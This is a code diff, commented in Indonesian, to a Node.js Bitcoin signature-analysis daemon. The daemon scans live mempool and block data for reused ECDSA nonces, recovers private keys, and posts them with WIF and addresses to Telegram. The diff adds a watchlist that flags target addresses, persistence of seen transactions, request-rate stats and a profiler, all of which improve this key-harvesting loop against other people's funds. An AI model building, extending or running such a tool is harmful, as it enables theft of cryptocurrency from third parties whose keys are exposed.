@@ -1220,6 +1220,86 @@ function appendHit(path, text) {
   s.write(text);
 }
 
+// ---- Counter request global (dipakai untuk req/s di status bar daemon) ----
+const REQ_STATS = { total: 0, lastReset: Date.now(), windowCount: 0 };
+function _bumpReq() { REQ_STATS.total++; REQ_STATS.windowCount++; }
+function reqRatePerSec() {
+  const now = Date.now();
+  const dtSec = Math.max(0.001, (now - REQ_STATS.lastReset) / 1000);
+  const r = REQ_STATS.windowCount / dtSec;
+  REQ_STATS.windowCount = 0;
+  REQ_STATS.lastReset = now;
+  return r;
+}
+
+// ---- Persisted seenTxids (snapshot daemon supaya restart tidak re-scan) ----
+const SEEN_FILE = ".btc-cache/daemon-seen.json";
+function loadSeenSnapshot(maxAgeHours = 48) {
+  if (!existsSync(SEEN_FILE)) return null;
+  try {
+    const st = statSync(SEEN_FILE);
+    if (Date.now() - st.mtimeMs > maxAgeHours * 3600 * 1000) return null;
+    const raw = JSON.parse(readFileSync(SEEN_FILE, "utf8"));
+    if (!raw || !Array.isArray(raw.ids)) return null;
+    return raw.ids;
+  } catch { return null; }
+}
+function saveSeenSnapshot(lruSet) {
+  try {
+    ensureCacheDir();
+    const ids = Array.from(lruSet.m.keys());
+    // Tulis atomik via .tmp + rename supaya tidak corrupt kalau di-Ctrl+C saat write
+    const tmp = SEEN_FILE + ".tmp";
+    writeFileSync(tmp, JSON.stringify({ ts: Date.now(), ids }));
+    renameSync(tmp, SEEN_FILE);
+  } catch {}
+}
+
+// ---- Address watchlist (baca file daftar address per baris, abaikan komentar/empty) ----
+function loadWatchlist(file) {
+  if (!file || !existsSync(file)) return null;
+  try {
+    const lines = readFileSync(file, "utf8").split(/\r?\n/);
+    const set = new Set();
+    for (const ln of lines) {
+      const t = ln.trim();
+      if (!t || t.startsWith("#")) continue;
+      set.add(t);
+    }
+    return set.size > 0 ? set : null;
+  } catch { return null; }
+}
+
+// ---- Profiler ringkas (--profile) ----
+const PROFILE = { enabled: false, marks: new Map() };
+function profStart(label) {
+  if (!PROFILE.enabled) return;
+  let m = PROFILE.marks.get(label);
+  if (!m) { m = { totalMs: 0, calls: 0, _t: 0 }; PROFILE.marks.set(label, m); }
+  m._t = Date.now();
+}
+function profEnd(label) {
+  if (!PROFILE.enabled) return;
+  const m = PROFILE.marks.get(label);
+  if (!m || !m._t) return;
+  m.totalMs += Date.now() - m._t;
+  m.calls++;
+  m._t = 0;
+}
+function profReport() {
+  if (!PROFILE.enabled || PROFILE.marks.size === 0) return;
+  console.log();
+  console.log(c(C.gray, "  ┌─ PROFILE ───────────────────────────────────────────────┐"));
+  const rows = Array.from(PROFILE.marks.entries()).sort((a, b) => b[1].totalMs - a[1].totalMs);
+  for (const [label, m] of rows) {
+    const avg = m.calls ? (m.totalMs / m.calls).toFixed(1) : "0.0";
+    const line = "  " + label.padEnd(20) + " total=" + (m.totalMs + "ms").padEnd(10) +
+                 " calls=" + String(m.calls).padEnd(6) + " avg=" + avg + "ms";
+    console.log(c(C.dim, "  │") + line);
+  }
+  console.log(c(C.gray, "  └─────────────────────────────────────────────────────────┘"));
+}
+
 // ---- Rate limiter (token bucket sederhana, per host) ----
 // Dipakai untuk membatasi req/dtk supaya tidak kena 429 dari mempool.space.
 // Aktif jika CONFIG.daemon.rateLimit > 0 atau --rate-limit <n> dipakai.
@@ -1267,7 +1347,10 @@ async function esploraFetch(base, path) {
   for (let attempt = 1; attempt <= RETRY.maxAttempts; attempt++) {
     try {
       await rateLimitWait(url);
+      _bumpReq();
+      profStart("http");
       const r = await fetchWithTimeout(url, { headers: { "user-agent": "btc-sig-analyzer/1.0" } });
+      profEnd("http");
       if (r.ok) {
         const ct = r.headers.get("content-type") || "";
         return ct.includes("json") ? await r.json() : await r.text();
@@ -2076,6 +2159,7 @@ function help() {
   sub("--mode mempool|blocks    --limit <n>  (default: mempool, 100 tx)");
   row("node index.js daemon",                    "Scan otomatis loop (alert R-reuse)");
   sub("--mode mempool|blocks  --interval <dtk>  --limit <n/siklus>  --realtime");
+  sub("--watch <file.txt>   (alert ekstra utk address di watchlist)");
   row("node index.js tx <hex>",                  "Analisis raw hex transaksi");
   row("node index.js tx-file <path>",            "Analisis raw hex dari file");
   row("node index.js sig --r --s --z [--pub]",   "Analisis 1 signature manual");
@@ -2093,6 +2177,7 @@ function help() {
   flag("--verbose",           "Tampilkan tiap R/S/Z saat scan address");
   flag("--no-cache",          "Nonaktifkan cache lokal");
   flag("--amount <i>=<sat>",  "Nilai input ke-i dalam satoshi (untuk SegWit)");
+  flag("--profile",           "Tampilkan timing per fase di akhir run");
   flag("clear-cache",         "Hapus seluruh isi folder .btc-cache/");
   sectEnd();
 
@@ -2303,6 +2388,7 @@ async function interactiveMenu() {
       const dIntervalStr = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Interval detik [default 60]   : "))).trim();
       const dLimitStr    = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Maks TX/siklus [default 200]  : "))).trim();
       const dRtStr       = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " Realtime WebSocket? [y/N]     : "))).trim().toLowerCase();
+      const dWatch       = (await ask("  " + c(C.yellow + C.bold, ICON.arrow + " File watchlist [opsional]     : "))).trim();
       const dInterval = dIntervalStr ? Math.max(10, parseInt(dIntervalStr, 10) || 60) : 60;
       const dLimit    = dLimitStr    ? Math.max(1,  parseInt(dLimitStr,    10) || 200) : 200;
       const dRealtime = dRtStr === "y" || dRtStr === "ya" || dRtStr === "yes";
@@ -2315,6 +2401,7 @@ async function interactiveMenu() {
         interval:    dInterval,
         limit:       dLimit,
         realtime:    dRealtime,
+        watchFile:   dWatch || (CONFIG.daemon && CONFIG.daemon.watchFile) || null,
       });
     } else {
       rl.close();
@@ -2453,11 +2540,20 @@ async function runDaemon(opts = {}) {
   const realtime    = opts.realtime != null ? !!opts.realtime : !!(CONFIG.daemon && CONFIG.daemon.realtime);
   const seenLimit   = (CONFIG.daemon && CONFIG.daemon.seenLimit) || 200_000;
   const poolMaxAgeMs = ((CONFIG.daemon && CONFIG.daemon.poolMaxAgeHours) || 24) * 3600 * 1000;
+  const watchlist   = loadWatchlist(opts.watchFile);
+  const SAVE_SEEN_EVERY = 5;                // simpan snapshot tiap N siklus
 
   const seenTxids = new LRUSet(seenLimit);  // bounded set untuk hindari duplikat tx
   const sigPool   = [];                     // pool signature, dievict by waktu
   let cycle = 0, totalTx = 0, totalSigs = 0, totalHits = 0;
   let running = true;
+
+  // ---- Restore seenTxids dari snapshot disk (kalau ada & masih segar) ----
+  const snap = loadSeenSnapshot(48);
+  if (snap && snap.length) {
+    for (const id of snap) seenTxids.add(id);
+    console.log("  " + ICON.info + c(C.cyan, " Restore seenTxids dari snapshot: " + snap.length + " txid"));
+  }
 
   // ---- WebSocket "kick" untuk realtime: kalau ada update baru, potong sleep ----
   let ws = null;
@@ -2496,6 +2592,8 @@ async function runDaemon(opts = {}) {
   kv("Maks TX",   limitPerCycle + " tx per siklus", C.white);
   kv("Paralel",   concurrency + " request", C.dim);
   kv("Realtime",  realtime ? "WebSocket aktif (mempool.space)" : "Polling biasa", realtime ? C.green : C.dim);
+  if (watchlist) kv("Watchlist", opts.watchFile + " (" + watchlist.size + " address)", C.bold + C.yellow);
+  if (PROFILE.enabled) kv("Profile",  "AKTIF (timing per fase)", C.cyan);
   kv("API",       base, C.dim);
   kv("Hits file", hitsFile, C.dim);
   console.log();
@@ -2599,12 +2697,18 @@ async function runDaemon(opts = {}) {
         const hasNew = list.some((s) => freshSet.has(s.txid));
         if (!hasNew) continue;
 
+        // ---- Cek apakah hit menyentuh address di watchlist ----
+        const hitWatch = watchlist ? list.some((s) => s.address && watchlist.has(s.address)) : false;
+
         totalHits++;
         console.log();
-        console.log(c(C.red + C.bold, "  " + ICON.alert + " R-REUSE DITEMUKAN! (siklus #" + cycle + ")"));
+        const tag = hitWatch ? " [WATCHLIST!]" : "";
+        const titleColor = hitWatch ? (C.bgRed + C.white + C.bold) : (C.red + C.bold);
+        console.log(c(titleColor, "  " + ICON.alert + " R-REUSE DITEMUKAN!" + tag + " (siklus #" + cycle + ")"));
         console.log(c(C.dim, "  R = " + r.slice(0, 32) + "…"));
         for (const s of list.slice(0, 4)) {
-          console.log(c(C.dim, "    tx " + (s.txid || "?").slice(0, 20) + "…  input#" + s.inputIndex + "  " + (s.address || "")));
+          const addrCol = (watchlist && s.address && watchlist.has(s.address)) ? C.yellow + C.bold : C.dim;
+          console.log(c(C.dim, "    tx " + (s.txid || "?").slice(0, 20) + "…  input#" + s.inputIndex + "  ") + c(addrCol, s.address || ""));
         }
 
         // Coba pulihkan private key (ambil 2 pertama)
@@ -2644,15 +2748,15 @@ async function runDaemon(opts = {}) {
                   appendHit(hitsFile, line);
                 } catch {}
 
-                // Notifikasi Telegram
+                // Notifikasi Telegram (fire-and-forget; jangan block daemon loop)
                 if (CONFIG.telegram.enabled) {
-                  await notifyTelegram([
-                    "🚨 *DAEMON R-REUSE HIT* (siklus #" + cycle + ")",
+                  notifyTelegram([
+                    (hitWatch ? "🚨🚨 *WATCHLIST HIT!* " : "🚨 ") + "*DAEMON R-REUSE HIT* (siklus #" + cycle + ")",
                     "Priv: `" + dHex + "`",
                     "WIF : `" + wif + "`",
                     "P2PKH: `" + addrC + "`",
                     "bc1  : `" + addrS + "`",
-                  ].join("\n"));
+                  ].join("\n")).catch(() => {});
                 }
                 break;
               }
@@ -2663,12 +2767,18 @@ async function runDaemon(opts = {}) {
       }
     }
 
-    // ---- Status bar ringkas ----
+    // ---- Status bar ringkas (+ mem & req/s) ----
+    const memMB = (process.memoryUsage().rss / 1024 / 1024).toFixed(0);
+    const rps = reqRatePerSec().toFixed(1);
     console.log(c(C.gray,
       "    Total: siklus=" + cycle + "  tx=" + totalTx +
       "  sig=" + totalSigs + "  hit=" + totalHits +
-      "  pool=" + sigPool.length + "  seen=" + seenTxids.size
+      "  pool=" + sigPool.length + "  seen=" + seenTxids.size +
+      "  mem=" + memMB + "MB  req/s=" + rps
     ));
+
+    // ---- Snapshot seenTxids berkala (atomic write) ----
+    if (cycle % SAVE_SEEN_EVERY === 0) saveSeenSnapshot(seenTxids);
 
     // ---- Tunggu interval berikutnya (WS kick memotong sleep di mode realtime) ----
     if (running) {
@@ -2695,6 +2805,7 @@ async function runDaemon(opts = {}) {
   }
 
   // ---- Cleanup ----
+  saveSeenSnapshot(seenTxids);   // simpan snapshot terakhir
   if (ws) { try { ws.removeAllListeners(); ws.close(); } catch {} }
   for (const s of _hitsStreams.values()) { try { s.end(); } catch {} }
   _hitsStreams.clear();
@@ -2705,11 +2816,15 @@ async function runDaemon(opts = {}) {
   kv("Total tx",     String(totalTx), C.cyan);
   kv("Total sig",    String(totalSigs), C.cyan);
   kv("Total hit",    String(totalHits), totalHits > 0 ? C.green : C.dim);
+  kv("Total req",    String(REQ_STATS.total), C.dim);
+  kv("Snapshot",     SEEN_FILE + " (" + seenTxids.size + " txid)", C.dim);
   console.log();
+  profReport();
 }
 
 async function main() {
   if (hasFlag("no-cache")) CACHE_ENABLED = false;
+  if (hasFlag("profile")) PROFILE.enabled = true;
   if (cmd === "clear-cache") {
     if (existsSync(CACHE_DIR)) {
       rmSync(CACHE_DIR, { recursive: true, force: true });
@@ -2799,6 +2914,7 @@ async function main() {
       hitsFile:    getOpt("hits") || CONFIG.hitsFile,
       concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : CONFIG.concurrency,
       realtime:    hasFlag("realtime") ? true : (CONFIG.daemon && CONFIG.daemon.realtime),
+      watchFile:   getOpt("watch") || (CONFIG.daemon && CONFIG.daemon.watchFile) || null,
     });
   } else {
     console.error(c(C.red, "Perintah tidak dikenal: " + cmd));
